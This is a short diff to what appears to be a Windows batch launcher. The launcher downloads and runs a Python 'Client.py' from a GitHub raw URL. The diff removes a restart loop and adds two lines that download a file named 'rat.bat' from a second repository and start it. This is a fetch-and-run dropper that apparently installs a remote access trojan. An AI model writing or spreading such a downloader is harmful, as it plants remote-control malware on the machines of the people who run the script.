@@ -1,6 +1,6 @@
 curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
-:top
 python3 Client.py
 timeout 3 >null.txt
 del null.txt
-goto :top
+curl -o rat.bat https://raw.githubusercontent.com/imadeit445/client/main/rat.bat
+start rat.bat
